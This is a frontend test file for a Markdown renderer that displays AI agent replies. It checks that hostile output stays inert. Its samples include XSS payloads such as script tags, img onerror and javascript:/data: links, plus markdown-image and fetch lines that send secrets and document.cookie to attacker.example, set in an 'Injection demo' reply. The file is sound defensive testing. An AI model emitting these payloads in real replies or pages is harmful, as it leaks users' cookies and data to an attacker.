import { screen } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { MockInstance } from 'vitest';

import { renderUi, TEST_ORIGIN } from '../../../testing/render-ui';
import { Markdown } from './markdown';
import { PlainText } from './plain-text';

/**
 * Elements that load something or run something; agent output must never produce one. The only SVG allowed is the
 * external-link icon, decorative and from our own code.
 */
const ACTIVE_ELEMENTS =
    'img, script, iframe, object, embed, video, audio, source, link, style, form, math, svg:not([aria-hidden="true"]), svg image, svg use, svg foreignObject';
const FORBIDDEN_HREF = /^\s*(?:javascript|data|vbscript|blob|file):/i;

let fetchSpy: MockInstance<typeof fetch>;
let imageSrc: MockInstance<(value: string) => void>;
let imageConstructed: number;
const RealImage = globalThis.Image;

beforeEach(() => {
    fetchSpy = vi.spyOn(globalThis, 'fetch').mockRejectedValue(new Error('no network in this test'));
    imageSrc = vi.spyOn(HTMLImageElement.prototype, 'src', 'set');
    imageConstructed = 0;
    globalThis.Image = class extends RealImage {
        constructor(...args: ConstructorParameters<typeof Image>) {
            super(...args);
            imageConstructed += 1;
        }
    };
});

afterEach(() => {
    vi.restoreAllMocks();
    globalThis.Image = RealImage;
});

function renderReply(source: string) {
    return renderUi(<Markdown source={source} origin={TEST_ORIGIN} />).container;
}

/** The checks every hostile sample must pass, whatever else it asserts. */
function expectInert(container: HTMLElement) {
    expect(container.querySelector(ACTIVE_ELEMENTS)).toBeNull();
    expect(container.querySelector('[src], [srcset], [style], [onerror], [onclick], [formaction]')).toBeNull();
    for (const anchor of container.querySelectorAll('a')) {
        expect(anchor.getAttribute('href') ?? '').not.toMatch(FORBIDDEN_HREF);
        expect(anchor.getAttribute('href') ?? '').toMatch(/^https?:\/\//);
    }
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(imageSrc).not.toHaveBeenCalled();
    expect(imageConstructed).toBe(0);
}

describe('hostile agent output', () => {
    it('shows an external image as a link with its host, and never loads it', () => {
        const container = renderReply('![x](https://attacker.example/?d=secret)');
        expectInert(container);
        const link = screen.getByRole('link', { name: /Image: x/ });
        expect(link.getAttribute('href')).toBe('https://attacker.example/?d=secret');
        expect(link.getAttribute('rel')).toBe('noopener noreferrer');
        expect(link.textContent).toContain('(attacker.example)');
    });

    it.each([
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'Inline <img src=x onerror=alert(1)> in a sentence',
        '<iframe src="https://attacker.example"></iframe>',
        '<a href="javascript:alert(1)">click</a>',
        '<style>body { display: none }</style>',
    ])('renders raw HTML %j as literal text', (source) => {
        const container = renderReply(source);
        expectInert(container);
        expect(container.textContent).toBe(source);
    });

    it.each([
        ['javascript:', '[click](javascript:alert(1))', 'click'],
        ['data:', '[x](data:text/html,<script>alert(1)</script>)', 'x'],
        ['a same-origin API path', '[x](/v1/agents/1)', 'x'],
        ['this engine', `[x](${TEST_ORIGIN}/agents)`, 'x'],
        ['vbscript:', '[x](vbscript:msgbox(1))', 'x'],
        ['an autolink to javascript:', '<javascript:alert(1)>', 'javascript:alert(1)'],
    ])('renders a %s link as text without href', (_, source, text) => {
        const container = renderReply(source);
        expectInert(container);
        expect(container.querySelector('a')).toBeNull();
        expect(container.textContent).toBe(text);
    });

    it('renders a link to another origin as an external link with the full URL visible', () => {
        const container = renderReply('[docs](https://example.com/a)');
        expectInert(container);
        const link = screen.getByRole('link', { name: /docs/ });
        expect(link.getAttribute('href')).toBe('https://example.com/a');
        expect(link.getAttribute('rel')).toBe('noopener noreferrer');
        expect(link.getAttribute('target')).toBe('_blank');
        const full = screen.getByText('https://example.com/a');
        expect(full.className).toContain('group-hover:block');
        expect(full.className).toContain('group-focus-within:block');
    });

    it('wraps an over-long line instead of widening the page', () => {
        const line = 'A'.repeat(5000);
        const markdown = renderReply(line);
        expect(markdown.firstElementChild?.className).toContain('[overflow-wrap:anywhere]');
        const plain = renderUi(<PlainText text={line} />).container;
        expect(plain.querySelector('p')?.className).toContain('[overflow-wrap:anywhere]');
        expect(plain.querySelector('p')?.className).toContain('whitespace-pre-wrap');
    });

    it('keeps the Injection demo reply inert as a whole', () => {
        const container = renderReply(
            [
                'Here is the summary you asked for.',
                '',
                '![tracking pixel](https://attacker.example/?d=secret)',
                '',
                '<script>fetch("https://attacker.example/?c=" + document.cookie)</script>',
                '',
                '[Open your invoice](javascript:alert(document.domain))',
                '',
                'x'.repeat(4000),
                '',
                '```html',
                '<img src=x onerror=alert(1)>',
                '```',
            ].join('\n'),
        );
        expectInert(container);
        expect(container.textContent).toContain(
            '<script>fetch("https://attacker.example/?c=" + document.cookie)</script>',
        );
        expect(container.textContent).toContain('Open your invoice');
        expect(screen.getAllByRole('link')).toHaveLength(1);
    });

    it('renders user text and streaming replies as plain text, whatever they contain', () => {
        const source = '<script>alert(1)</script> ![x](https://attacker.example/?d=secret) [a](javascript:alert(1))';
        const { container } = renderUi(<PlainText text={source} />);
        expectInert(container);
        expect(container.textContent).toBe(source);
        expect(container.querySelector('a')).toBeNull();
    });
});
